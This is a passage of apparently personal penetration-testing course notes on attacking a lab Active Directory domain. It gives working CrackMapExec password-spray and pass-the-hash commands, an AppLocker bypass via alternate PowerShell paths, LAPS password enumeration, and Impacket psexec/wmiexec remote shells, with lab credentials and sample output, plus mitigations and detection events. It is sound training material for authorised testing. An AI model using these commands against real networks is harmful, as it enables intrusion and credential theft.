- `| grep +` — Filters for lines containing `+` — CrackMapExec marks successful logins with `[+]`, so this extracts only the successful authentication results

**Validating credentials after getting a hit:**

```bash
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

A successful result shows `[+] INLANEFREIGHT.LOCAL\avazquez:Password123` confirming the credentials are valid.

---

### Local Administrator Password Reuse

Password spraying isn't just for domain accounts — it also works against **local administrator accounts**. In many organizations, IT teams set up workstations and servers using the same "gold image" — a template that gets copied to every machine. This often means every machine ends up with the same local administrator username and password. If we crack or capture the local admin password from one machine, there's a good chance it works on many others across the network. This is especially worth trying against high-value targets like SQL servers, Exchange servers, or any machine that's likely to have privileged users logged in.

It's also worth thinking creatively about password patterns. If we find a desktop with the local admin password `$desktop%@admin123`, it's reasonable to try `$server%@admin123` on servers. Similarly, if we find a non-standard local account like `bsmith`, that same password might work on the domain account `bsmith` too. Password reuse is one of the most common issues found in enterprise environments.

If we only have the **NT hash** (not the plaintext password), we can still spray it using a pass-the-hash technique with CrackMapExec. The `--local-auth` flag is critical here — it tells the tool to authenticate against each machine's local SAM database (not the domain), and it only tries **once per machine**, so we won't lock out any domain accounts. Always make sure this flag is set before running this type of spray.

**Local Admin Spraying with CrackMapExec (using NT hash):**

```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

**Command Breakdown:**
- `--local-auth` — Authenticates against each host's **local** accounts (not domain), tries only once per machine — no lockout risk
- `172.16.5.0/23` — Scans the entire /23 subnet (512 IPs)
- `-u administrator` — The local administrator username
- `-H 88ad09182de639ccc6579eb0849751cf` — The **NT hash** for pass-the-hash authentication
- `| grep +` — Filters for successful hits only

**Example Output:**

```
SMB  172.16.5.50   445  ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09... (Pwn3d!)
SMB  172.16.5.25   445  ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09... (Pwn3d!)
SMB  172.16.5.125  445  ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09... (Pwn3d!)
```

The same local admin password was reused on 3 machines — giving us local admin access on all of them. This technique is noisy and not suitable for stealth-focused assessments, but it's a very common and impactful finding worth looking for during any internal pentest. The best way for a client to fix this is by deploying **[LAPS (Local Administrator Password Solution)](https://www.microsoft.com/en-us/download/details.aspx?id=46899)** — a free Microsoft tool that manages local administrator passwords through Active Directory, enforcing a unique and automatically rotating password on every host.

---

## Internal Password Spraying - from Windows

If we've landed on a domain-joined Windows host, we can perform password spraying directly from Windows using the **[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)** tool. When already authenticated to the domain, it automatically pulls the user list from Active Directory, reads the password policy, and skips accounts close to lockout — keeping us safe from causing lockouts. If we're not yet authenticated, we can still supply our own user list using the `-UserList` flag. We provide one password, let the tool run, and save the results to a file for review.

### Using DomainPasswordSpray.ps1

Since the host is already domain-joined, we skip the `-UserList` flag and let the tool generate the user list automatically from AD. We supply the password to try, and use `-OutFile` to save any hits to a file:

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

**Command Breakdown:**
- `Import-Module .\DomainPasswordSpray.ps1` — Loads the DomainPasswordSpray module into the PowerShell session
- `Invoke-DomainPasswordSpray` — Runs the password spray attack function
- `-Password Welcome1` — The single password to spray against all domain users
- `-OutFile spray_success` — Writes any successful logins to the file `spray_success`
- `-ErrorAction SilentlyContinue` — Suppresses non-critical error messages so the output stays clean

The tool automatically checks the password policy, identifies accounts close to lockout, removes them from the target list, and sprays the remaining users. It confirms success:
`[*] SUCCESS! User:sgage Password:Welcome1`

---

### Mitigations and Detection

**Mitigation Techniques:**

| Technique | Description |
|---|---|
| **Multi-factor Authentication** | MFA can greatly reduce the risk of password spraying attacks. However, certain MFA implementations still disclose if the username/password combination is valid. |
| **Restricting Access** | Log into applications should be restricted to those who require it per the principle of least privilege |
| **Reducing Impact** | Ensure privileged users have separate accounts for administrative activities. Network segmentation isolates compromised subnets. |
| **Password Hygiene** | Educating users on selecting passphrases rather than simple passwords. Using a password filter to restrict common dictionary words, names of months, seasons, and variations on the company's name. |

**Detection:**
- Many account lockouts in a short period
- Server or application logs showing many login attempts with valid or non-existent users
- Many requests in a short period to a specific application or URL
- **Event ID 4625: An account failed to log on** — many instances over a short period may indicate a spraying attack
- **Event ID 4771: Kerberos pre-authentication failed** — for LDAP-targeted spraying attempts (requires Kerberos logging to be enabled)

**External Password Spraying targets (outside scope of this module):** Microsoft 0365, Outlook Web Exchange, Exchange Web Access, Skype for Business, Lync Server, Microsoft Remote Desktop Services Portals, Citrix portals, VDI implementations, VPN portals (Citrix, SonicWall, OpenVPN, Fortinet), custom web applications.

---

## Enumerating Security Controls

Once we have a foothold inside the network, one of the first things we should do is understand what security tools and protections are in place. Different organizations use different defensive products, and knowing what we're up against directly affects which of our tools will work and which will get blocked. For example, a host with Windows Defender enabled will block many common offensive PowerShell scripts, while AppLocker policies might prevent us from running executables in certain directories. Some organizations apply strict controls across the entire environment, while others only harden certain machines — meaning the same tool might work on one host but get caught on another. Understanding the defensive landscape early saves us time and helps us plan the best approach.

---

### Windows Defender

**[Windows Defender](https://en.wikipedia.org/wiki/Microsoft_Defender)** (renamed Microsoft Defender after the Windows 10 May 2020 Update) is the built-in antivirus and anti-malware solution on Windows. Over the years it has become significantly more capable and will, by default, block many common offensive tools like PowerView. Before dropping any tools onto a system, it's important to check if Defender is running and what protections are active — this tells us whether we need to find a bypass first. We can check its status using the built-in PowerShell cmdlet `Get-MpComputerStatus`.

```powershell
Get-MpComputerStatus
```

**Key attributes to note in the output:**
- `RealTimeProtectionEnabled : True` — Defender's real-time protection is active and scanning files as they are accessed
- `AntispywareEnabled : True` — Anti-spyware protection is enabled
- `AntivirusEnabled : True` — Antivirus protection is active
- `BehaviorMonitorEnabled : True` — Behavioral monitoring watches for suspicious activity patterns
- `IsTamperProtected : True` — Tamper protection prevents changes to Defender settings without authorization
- `AMEngineVersion` — The version of the anti-malware engine
- `AntispywareSignatureVersion` — Current signature database version for detecting known threats

If `RealTimeProtectionEnabled` is `True`, we will need to find ways to bypass Defender before dropping tools onto the system.

---

### AppLocker

**[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)** is Microsoft's application whitelisting tool — it lets admins create rules that control exactly which programs, scripts, and files users are allowed to run on a machine. Think of it as a bouncer that checks an approved list before letting any program execute. Organizations commonly use it to block things like `cmd.exe` and `PowerShell.exe` to stop attackers from running scripts. However, AppLocker rules are often incomplete — admins block the main PowerShell executable but forget about other locations where PowerShell lives, like the 32-bit version or PowerShell ISE. There are also many other creative bypasses, so AppLocker is a hurdle, not a wall. Enumerating the active rules tells us exactly what's blocked and helps us find the gaps.

AppLocker controls a wide range of file types — executables, scripts, Windows installer files, DLLs, packaged apps, and more. A very common setup is blocking `cmd.exe` and `PowerShell.exe` and restricting write access to certain directories. However, **all of this can be bypassed**. The key weakness is that admins typically only block the main 64-bit PowerShell path:
`%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe`

But completely forget about the other locations PowerShell exists at, such as:
- `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` — the 32-bit version
- `PowerShell_ISE.exe` — PowerShell ISE, a different executable entirely

So even when we see an AppLocker rule blocking PowerShell, we can simply call it from one of these other paths and bypass the restriction entirely. Sometimes we run into stricter, more thorough AppLocker policies that need more creative bypasses — but the concept remains the same: find what they forgot to block.

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

**Command Breakdown:**
- `Get-AppLockerPolicy -Effective` — Retrieves the currently **effective** AppLocker policy (the merged result of all local and domain policies)
- `select -ExpandProperty RuleCollections` — Expands and displays the `RuleCollections` property, which contains all the actual AppLocker rules

**Example output reveals:**

```
PathConditions : {%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE}
Action         : Deny
Name           : Block PowerShell
```

This shows Domain Users are blocked from running the 64-bit PowerShell executable — but as noted above, the 32-bit version and PowerShell ISE remain accessible.

---

### PowerShell Constrained Language Mode

**[PowerShell Constrained Language Mode (CLM)](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)** is a security feature that strips PowerShell down to a limited, safer set of capabilities. In normal (Full Language) mode, PowerShell can do almost anything — run .NET code, interact with COM objects, load external assemblies, and more. CLM locks most of that down, which breaks a huge number of offensive PowerShell tools and scripts. It's often paired with AppLocker or Windows Defender Application Control policies. If we land on a host in CLM, many of our go-to tools simply won't run, and we'll need to find workarounds or switch to compiled tools instead. Checking the language mode is a quick one-liner and should be done early after gaining access.

```powershell
$ExecutionContext.SessionState.LanguageMode
```

**Example Output:**

```
ConstrainedLanguage
```

**Command Breakdown:**
- `$ExecutionContext` — A PowerShell automatic variable containing the host's execution context
- `.SessionState.LanguageMode` — Accesses the language mode of the current session

**Possible values:**
- `FullLanguage` — All PowerShell language features are available (normal mode)
- `ConstrainedLanguage` — Many features are blocked; significantly limits what attackers can do

If CLM is in place, many offensive PowerShell tools will fail, requiring us to find workarounds.

---

### LAPS

**Microsoft's Local Administrator Password Solution (LAPS)** solves one of the most common problems in enterprise environments — local administrator password reuse. Without LAPS, many organizations set the same local admin password on every machine (often from a gold image), which means if we get that password from one machine, we can access every machine. LAPS fixes this by having Active Directory automatically generate, store, and rotate a unique random password for the local administrator account on each machine. The passwords are stored as an attribute in AD and only specific users or groups are granted permission to read them. As attackers, we want to find out two things: which machines have LAPS installed (and which don't — the ones without it are easier targets), and which domain users or groups have permission to read those LAPS passwords, since compromising one of those accounts could give us local admin access across many machines. The **LAPSToolkit** makes this enumeration straightforward.

**LAPSToolkit** functions for enumerating LAPS:

**Finding groups delegated to read LAPS passwords:**

```powershell
Find-LAPSDelegatedGroups
```

**Command Breakdown:**
- `Find-LAPSDelegatedGroups` — A LAPSToolkit function that parses `ExtendedRights` for all computers with LAPS enabled, showing groups specifically delegated to read LAPS passwords

This is important because the groups shown here are the ones that have been **specifically given permission** to read LAPS passwords — these are often privileged or protected groups in the domain. Additionally, any account that originally **joined a computer to the domain** automatically receives `All Extended Rights` over that machine, which also grants the ability to read its LAPS password. This means even a regular user who happened to join a machine to the domain years ago might still be able to read that machine's local admin password today — a commonly overlooked privilege that's worth hunting for.

**Finding users with All Extended Rights who can read LAPS passwords:**

```powershell
Find-AdmPwdExtendedRights
```

**Command Breakdown:**
- `Find-AdmPwdExtendedRights` — Checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with this right can read LAPS passwords and may be less protected than delegated group members.

**Listing computers with LAPS enabled and their passwords (if readable):**

```powershell
Get-LAPSComputers
```

**Command Breakdown:**
- `Get-LAPSComputers` — Searches for computers that have LAPS enabled, showing when passwords expire, and even the randomized passwords in cleartext if our user has read access

Output shows ComputerName, Password (cleartext if accessible), and Expiration date for each LAPS-managed computer.

---

## Credentialed Enumeration - from Linux

Now that we have a foothold in the domain, it's time to dig deeper using our domain user credentials. Even a low-privilege account opens up a lot — we can pull information about users, computers, groups, Group Policy Objects, permissions, ACLs, and trust relationships. The key thing to remember is that **almost all of these tools require at least one valid domain credential** — a plaintext password, an NTLM hash, or SYSTEM access on a domain-joined host. Without that, most of these tools simply won't work. For all examples in this section, we'll be using User=`forend` and password=`Klmcargo2`.

---

### CrackMapExec

**CrackMapExec (CME)** is one of the most versatile tools for assessing AD environments from Linux. It supports multiple protocols (SMB, WinRM, MSSQL, SSH) and can enumerate users, groups, shares, sessions, and much more — all with a single tool and a set of valid credentials.

**Viewing CME SMB help:**

```bash
crackmapexec smb -h
```

CME offers a dedicated help menu for each protocol (e.g., `crackmapexec winrm -h`, `crackmapexec mssql -h`). The SMB module is the one we'll use most often for AD enumeration. The key flags we'll be working with are:

| Flag | What it does |
|------|-------------|
| `-u USERNAME` | The username to authenticate with |
| `-p PASSWORD` | The user's password |
| `Target (IP/FQDN)` | The host to enumerate — we'll target the DC |
| `--users` | Enumerates all domain users |
| `--groups` | Enumerates all domain groups |
| `--loggedon-users` | Shows who is currently logged into the target host |

Always run CME commands with `sudo` and target the Domain Controller first, since it holds the full AD database.

**Domain User Enumeration with CME:**

When we point CME at the Domain Controller with valid credentials and the `--users` flag, it pulls back a full list of every domain user along with useful attributes like `badPwdCount` (how many times they've entered a wrong password recently). This is especially handy before a password spray — we can filter out any accounts with a `badPwdCount` above 0 to avoid accidentally locking them out.

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

**Command Breakdown:**
- `crackmapexec smb 172.16.5.5` — Uses CME's SMB module against the DC
- `-u forend` — Authenticating username
- `-p Klmcargo2` — Authenticating password
- `--users` — Enumerates domain users, showing each user's `badpwdcount` and `baddpwdtime` attributes

**Domain Group Enumeration:**

The `--groups` flag lists all groups in the domain along with how many members each one has. This helps us quickly identify high-value groups worth targeting — things like **Administrators**, **Domain Admins**, **Executives**, or any privileged IT admin groups. Built-in groups on the DC (like `Backup Operators`) are also shown and are worth noting.

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

**Logged On Users Enumeration:**

The `--loggedon-users` flag lets us check what users are currently logged into any host we point it at — not just the DC. This is very useful for hunting privileged users. If we see a domain admin actively logged into a file server and we have local admin rights on that server, we may be able to steal their credentials from memory.

```bash
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

**Command Breakdown:**
- `172.16.5.130` — Targeting a file server to see who's currently logged in
- `--loggedon-users` — Enumerates currently logged-on users on the target host

If `(Pwn3d!)` appears after authentication, our user `forend` is a local admin on that host. Spotting a domain admin like `svc_qualys` logged in means we may be able to steal their credentials from memory — a potentially easy win.

**Share Enumeration:**

The `--shares` flag shows us every share available on the target and exactly what level of access we have — READ, WRITE, or none. Non-standard shares like `Department Shares`, `User Shares`, or `ZZZ_archive` are always worth investigating as they often contain sensitive files, scripts, or credentials.

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

**Spidering shares for files:**

Once we find readable shares, the `spider_plus` module automatically crawls through every folder and subfolder and logs every readable file it finds along with metadata like size and timestamps. Results are saved to a JSON file we can review to hunt for scripts, config files, or documents that might contain passwords or other sensitive info.

```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

**Command Breakdown:**
- `-M spider_plus` — Loads the spider_plus module to recursively crawl all readable shares
- `--share 'Department Shares'` — Limits spidering to this specific share

Results are written to `/tmp/cme_spider_plus/<ip>.json` and can be reviewed with:

```bash
head -n 10 /tmp/cme_spider_plus/172.16.5.5.json
```

---

### SMBMap

**SMBMap** is a dedicated SMB share enumeration tool that's great for quickly mapping out what shares exist on a host, what permissions we have on each one, and what files are inside. Unlike CME which does many things, SMBMap is laser-focused on SMB — making it very clean and easy to read. We can use it to list shares, recursively browse directories, download or upload files, and even search file contents. It's especially useful for methodically going through shares after we've identified them.

**Checking share access with SMBMap:**

```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

**Command Breakdown:**
- `smbmap` — SMB enumeration tool
- `-u forend` — Username for authentication
- `-p Klmcargo2` — Password for authentication
- `-d INLANEFREIGHT.LOCAL` — Domain name
- `-H 172.16.5.5` — Target host IP

Output shows each share name, permissions (READ ONLY, READ WRITE, NO ACCESS), and a comment.

**Recursive directory listing:**

```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

**Command Breakdown:**
- `-R 'Department Shares'` — Recursively list contents of the "Department Shares" share
- `--dir-only` — Only show directories, not individual files (reduces output volume)

Output shows subdirectories like Accounting, Executives, Finance, HR, IT, Legal, Marketing, Operations, R&D, Temp, and Warehouse.

---

### rpcclient

**rpcclient** is a Samba tool for talking directly to Windows machines over Microsoft RPC (Remote Procedure Call). It's powerful because it gives us low-level access to information that higher-level tools sometimes miss — things like detailed user attributes, group memberships, password policies, and even printer and share info. We can use it authenticated (with credentials) or unauthenticated (via a NULL session if the target allows it). Once connected, we get an interactive prompt where we can run various enumeration commands one at a time.

**Connecting via NULL session:**

```bash
rpcclient -U "" -N 172.16.5.5
```

**rpcclient Enumeration - Understanding RIDs and SIDs**

Every object in Active Directory has a unique identifier called a **SID (Security Identifier)**. The SID is made up of two parts — the **domain SID** (same for every object in the domain) plus a **RID (Relative Identifier)** that's unique to each object. Think of it like a street address: the domain SID is the city, and the RID is the house number. Together they uniquely identify every user, group, and computer in AD.

For example:
- Domain SID: `S-1-5-21-3842939050-3880317879-2865463114`
- `htb-student` has RID `0x457` (hex) = `1111` (decimal)
- Full SID: `S-1-5-21-3842939050-3880317879-2865463114-1111`

Some RIDs are fixed across every Windows machine — the built-in **Administrator** account always has RID `500` (`0x1f4`), the **Guest** account always `501`, and so on. Knowing these lets us query specific accounts directly by their RID, even without knowing the username first.

**Enumerating all domain users:**

```
rpcclient $> enumdomusers
```

Output: `user:[administrator] rid:[0x1f4]`, `user:[htb-student] rid:[0x457]`, etc.

**Querying a specific user by RID:**

```
rpcclient $> queryuser 0x457
```

Returns detailed user info: Full Name, Password last set, Logon hours, bad password count, logon count, group RID, and more.

---

### Impacket Toolkit

**Impacket** is a Python library and collection of scripts that lets us interact with Windows network protocols — SMB, RPC, Kerberos, LDAP, and more — directly from Linux. It's one of the most widely used offensive toolkits in penetration testing because it lets us do things normally only possible from Windows (like getting a shell, dumping hashes, or interacting with AD) entirely from our Linux attack host. It's actively maintained and constantly updated with new attack techniques. For this section we'll focus on two of its most useful tools: **psexec.py** for getting a SYSTEM shell, and **wmiexec.py** for a stealthier interactive shell.

**Using psexec.py:**

**psexec.py** is a remote execution tool that gives us a fully interactive shell as **SYSTEM** on the target. It works by uploading a randomly-named executable to the `ADMIN$` share, registering it as a Windows service via RPC, then communicating back through a named pipe. It's powerful but noisy — it writes a file to disk and creates a new service, both of which are easily detected by EDR tools.

```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

**Command Breakdown:**
- `psexec.py` — The Impacket psexec script
- `inlanefreight.local/wley:'transporter@4'` — Specifies `domain/username:password` format for authentication
- `@172.16.5.125` — Target host IP address

Requirement: credentials for a user with **local administrator privileges** on the target host. Once connected, we are dropped into the `system32` directory with SYSTEM-level access.

**Using wmiexec.py:**

**wmiexec.py** utilizes a semi-interactive shell where commands are executed through **Windows Management Instrumentation (WMI)**. It does not drop any files or executables on the target host and generates fewer logs than psexec.py. After connecting, it runs as the local admin user (not SYSTEM), making it more stealthy.

```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

**Drawback:** Not fully interactive — each command issues a new `cmd.exe` process via WMI, which generates event ID **4688: A new process has been created** for each command. A vigilant defender could spot these.

---

### Windapsearch

**Windapsearch** is a Python script to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries.

**Enumerating Domain Admins:**

```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

**Command Breakdown:**
- `--dc-ip 172.16.5.5` — Domain Controller IP
- `-u forend@inlanefreight.local` — Username in UPN (User Principal Name) format
- `-p Klmcargo2` — Password
- `--da` — Enumerate Domain Admins group members (performs recursive lookup for nested members)

**Finding privileged users recursively:**

```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

**Command Breakdown:**
- `-PU` — Find **Privileged Users** — performs recursive searches for users with elevated privileges through nested group membership. This reveals users who have Domain Admin or equivalent rights through indirect group membership (nested groups), which is easy to miss without this type of recursive lookup.

The `-PU` option is particularly valuable for reporting — it shows customers users with excess privileges from nested group membership that they may not even be aware of.

---

### Bloodhound.py

**BloodHound** is arguably the most impactful tool ever made for Active Directory security assessments. What makes it special is that it doesn't just list information — it maps out **attack paths**, showing you visually how a low-privilege user could potentially reach Domain Admin through a chain of permissions, group memberships, and misconfigurations that would be nearly impossible to spot manually. It uses **[graph theory](https://en.wikipedia.org/wiki/Graph_theory)** under the hood — treating every user, group, computer, and permission as a node and drawing the connections between them so you can instantly see paths that would take days to find manually.

The tool has two parts:
- **The collector (ingestor)** — gathers all the raw data from AD. On Windows this is **[SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)** (written in C#). From Linux, we use **BloodHound.py**, a Python port that works with just valid domain credentials and no Windows machine needed.
- **The GUI** — takes the collected JSON files, loads them into a **neo4j** graph database, and lets us run pre-built or custom **[Cypher language](https://specterops.io/blog/2017/09/18/bloodhound-intro-to-cypher/)** queries to find attack paths visually.

It collects: users, groups, computers, group memberships, GPOs, ACLs, domain trusts, local admin access, user sessions, RDP access, WinRM access, and more.

**Executing BloodHound.py:**

```bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

**Command Breakdown:**
- `-u 'forend'` — Domain user for authentication
- `-p 'Klmcargo2'` — Password
- `-ns 172.16.5.5` — Nameserver (DC's IP) for DNS/LDAP lookups
- `-d inlanefreight.local` — The domain to enumerate
- `-c all` — Run **all** collection methods (Group, LocalAdmin, Session, Trusts, ACL, ObjectProps, RDP, DCOM, etc.)

**Example Output:**

```
INFO: Found AD domain: inlanefreight.local
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 564 computers
INFO: Found 2951 users
INFO: Found 183 groups
INFO: Found 2 trusts
INFO: Starting computer enumeration with 10 workers
```

After completion, JSON files appear in the current directory:

```
20220307163102_computers.json  20220307163102_domains.json
20220307163102_groups.json     20220307163102_users.json
```

**Uploading to BloodHound GUI:**

Before uploading, zip all the JSON files together for a cleaner import:

```bash
zip -r ilfreight_bh.zip *.json
```

Then follow these steps:

1. Start the neo4j database: `sudo neo4j start`
2. Launch BloodHound GUI: `bloodhound` (from a freerdp/desktop session on the attack host)
3. Log in — default credentials: `neo4j` / `HTB_@cademy_stdnt!`
4. Click the **Upload Data** button on the right side of the window
5. Select the zip file (or individual JSON files) and click **Open**
6. Once loaded, go to the **Analysis** tab on the left to run queries

**Useful pre-built queries (Analysis tab):**
- **Find Shortest Paths To Domain Admins** — The most important query. Shows every logical path (through users, groups, hosts, ACLs, GPOs) that leads to Domain Admin. This is where we start planning lateral movement.
- **Find Computers with Unsupported Operating Systems** — Identifies legacy hosts vulnerable to older exploits
- **Find Computers where Domain Users are Local Admin** — Finds any host where every domain user has local admin rights — a huge misconfiguration

> **Tip:** Spend time exploring the **Node Info** tab when clicking on any user, group, or computer — it shows all relationships for that object. You can also paste custom Cypher queries into the **Raw Query** box at the bottom of the GUI for more targeted searches.

---

## Credentialed Enumeration - from Windows

Now that we've covered Linux-based enumeration, let's switch to doing the same from a **Windows attack host or a domain-joined machine**. From Windows we have access to a different set of tools — some built right into the OS, and some powerful third-party ones. The tools we'll cover here include the **ActiveDirectory PowerShell module**, **PowerView**, **SharpView**, **Snaffler**, and **SharpHound/BloodHound**. Some of what we find here won't directly lead to an attack path but will still be valuable to include in our report as informational or medium-risk findings — things like misconfigured permissions, legacy systems, or overly permissive shares. When we land on a Windows host in the domain (especially one used by an admin), there's often a chance we'll find useful tools and scripts already installed. Always check.

At this stage we're looking for: trust relationships with other domains, misconfigured permissions, sensitive data in file shares, and any misconfigurations that could allow lateral or vertical movement.

---

### ActiveDirectory PowerShell Module

The **ActiveDirectory PowerShell module** is a group of 147 built-in cmdlets for querying and managing AD directly from PowerShell. It's one of the stealthiest ways to enumerate AD because we're using tools that are already on the machine — no dropping files, no loading external scripts. Before using it, we need to make sure it's imported. The `Get-Module` cmdlet shows what's currently loaded; if the AD module isn't listed, we load it with `Import-Module ActiveDirectory`.

**Checking loaded modules:**

```powershell
Get-Module
```

**Loading the ActiveDirectory module:**

```powershell
Import-Module ActiveDirectory
```

**Getting domain information:**

```powershell
Get-ADDomain
```

Output includes: ChildDomains, DomainMode, DomainSID, Forest, PDCEmulator, RIDMaster, InfrastructureMaster, LinkedGroupPolicyObjects, and more.

**Finding Kerberoastable accounts (accounts with SPNs set):**

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

**Command Breakdown:**
- `Get-ADUser` — Retrieves AD user objects
- `-Filter {ServicePrincipalName -ne "$null"}` — Filters for users where `ServicePrincipalName` is **not null** (i.e., users with an SPN set, making them Kerberoastable)
- `-Properties ServicePrincipalName` — Includes the `ServicePrincipalName` property in the output (not returned by default)

**Checking domain trust relationships:**

```powershell
Get-ADTrust -Filter *
```

Output reveals: TrustType, TrustDirection (Bidirectional/Inbound/Outbound), ForestTransitive, and domain names. Useful for identifying cross-domain and cross-forest attack paths.

**Listing all domain groups:**

```powershell
Get-ADGroup -Filter * | select name
```

**Getting detailed info about a specific group:**

```powershell
Get-ADGroup -Identity "Backup Operators"
```

Output:
```
DistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
GroupCategory     : Security
GroupScope        : DomainLocal
Name              : Backup Operators
SamAccountName    : Backup Operators
SID               : S-1-5-32-551
```

**Getting group membership:**

```powershell
Get-ADGroupMember -Identity "Backup Operators"
```

Output shows user `backupagent` is a member. This matters because **Backup Operators** can back up and restore files on domain controllers — meaning they could back up the `NTDS.dit` file and extract all domain hashes. Any account in this group is worth targeting. Always enumerate group members for high-value built-in groups like this.

---

### PowerView

**PowerView** is a PowerShell tool for gaining deep situational awareness inside an AD environment. Think of it as a Swiss Army knife for AD recon — it can enumerate users, groups, computers, ACLs, GPOs, shares, sessions, and trust relationships, and even find where specific users are currently logged in across the network. It's part of the **PowerSploit** toolkit (now maintained by BC-Security as part of Empire 4). Unlike the built-in AD module which just reads data, PowerView also helps us identify subtle misconfigurations and relationships between objects that are easy to miss. It requires more manual work than BloodHound, but gives us more granular control over exactly what we're looking for.

**Key PowerView Functions:**

| Command | Description |
|---|---|
| `Export-PowerViewCSV` | Append results to a CSV file |
| `ConvertTo-SID` | Convert a User or group name to its SID value |
| `Get-DomainSPNTicket` | Requests the Kerberos ticket for a specified SPN account |
| `Get-Domain` | Returns the AD object for the current (or specified) domain |
| `Get-DomainController` | Returns a list of the Domain Controllers for the specified domain |
| `Get-DomainUser` | Returns all users or specific user objects in AD |
| `Get-DomainComputer` | Returns all computers or specific computer objects in AD |
| `Get-DomainGroup` | Returns all groups or specific group objects in AD |
| `Get-DomainOU` | Search for all or specific OU objects in AD |
| `Find-InterestingDomainAcl` | Finds object ACLs with modification rights set to non-built-in objects |
| `Get-DomainGroupMember` | Returns the members of a specific domain group |
| `Get-DomainFileServer` | Returns a list of servers likely functioning as file servers |
| `Get-DomainDFSShare` | Returns a list of all distributed file systems for the current domain |
| `Get-DomainGPO` | Returns all GPOs or specific GPO objects in AD |
| `Get-DomainPolicy` | Returns the default domain policy or DC policy for the current domain |
| `Get-NetLocalGroup` | Enumerates local groups on the local or a remote machine |
| `Get-NetLocalGroupMember` | Enumerates members of a specific local group |
| `Get-NetShare` | Returns open shares on the local (or a remote) machine |
| `Get-NetSession` | Returns session information for the local (or a remote) machine |
| `Test-AdminAccess` | Tests if the current user has administrative access to a machine |
| `Find-DomainUserLocation` | Finds machines where specific users are logged in |
| `Find-DomainShare` | Finds reachable shares on domain machines |
| `Find-InterestingDomainShareFile` | Searches for files matching specific criteria on readable shares |
| `Find-LocalAdminAccess` | Find machines where the current user has local admin access |
| `Get-DomainTrust` | Returns domain trusts for the current domain |
| `Get-ForestTrust` | Returns all forest trusts for the current forest |
| `Get-DomainForeignUser` | Enumerates users who are in groups outside of the user's domain |
| `Get-DomainForeignGroupMember` | Enumerates groups with users outside of the group's domain |
| `Get-DomainTrustMapping` | Enumerates all trusts for the current domain and any others seen |

**Loading PowerView and getting specific user info:**

```powershell
cd C:\Tools\
Import-Module .\PowerView.ps1
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

**Command Breakdown:**
- `Get-DomainUser -Identity mmorgan` — Retrieves the AD user object for `mmorgan`
- `-Domain inlanefreight.local` — Specifies the target domain
- `| Select-Object -Property ...` — Shows only the key properties. Notable ones: `admincount` (1 = has admin privileges), `serviceprincipalname` (set = Kerberoastable), `useraccountcontrol` (shows flags like DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH)

**Recursive group membership (finding nested Domain Admins):**

```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

The `-Recurse` switch is key here — if any groups are nested inside Domain Admins, it will dig into those groups too and list all their members. This reveals users who have Domain Admin rights indirectly through nested group membership, which is easy to miss without this switch. For example, if `Secadmins` is nested inside `Domain Admins`, all `Secadmins` members are effectively Domain Admins.

**Domain trust enumeration:**

```powershell
Get-DomainTrustMapping
```

Shows all trust relationships: SourceName, TargetName, TrustType, TrustAttributes, TrustDirection, and timestamps.

**Testing for local admin access on a specific host:**

```powershell
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```

Output:
```
ComputerName    IsAdmin
------------    -------
ACADEMY-EA-MS01    True
```

`Test-AdminAccess` attempts to access the `ADMIN$` share on the target — which requires local admin rights. A result of `True` means we have local admin on that machine. We can run this against multiple hosts to map out where we have admin access across the domain. BloodHound does this automatically at scale, but PowerView gives us targeted, on-demand checks.

**Finding users with SPNs set (Kerberoastable accounts):**

```powershell
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

**Command Breakdown:**
- `-SPN` — Filter to only return users with the `ServicePrincipalName` attribute set
